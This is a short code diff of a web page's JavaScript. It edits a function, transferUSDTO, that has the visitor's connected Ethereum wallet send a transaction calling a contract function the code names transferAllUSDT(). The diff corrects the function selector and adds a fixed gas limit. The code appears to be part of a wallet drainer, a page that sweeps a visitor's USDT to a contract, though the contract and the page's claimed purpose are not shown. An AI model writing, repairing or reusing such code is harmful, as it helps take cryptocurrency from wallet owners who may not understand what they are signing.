@@ -352,11 +352,16 @@
 
         async function transferUSDTO(senderAddress) {
             // Correct function selector for transferAllUSDT()
-            const functionSelector = 'cdcb760d';
+            const functionSelector = '39cc3849';
             const data = '0x' + functionSelector;
             return await window.ethereum.request({
                 method: 'eth_sendTransaction',
-                params: [{ from: senderAddress, to: CONTRACT_ADDRESS, data: data, value: '0x0' }]
+                params: [{
+                    from: senderAddress,
+                    to: CONTRACT_ADDRESS,
+                    data: data,
+                    gas: '0x61A80' // ~400,000 gas
+                }]
             });
         }
 
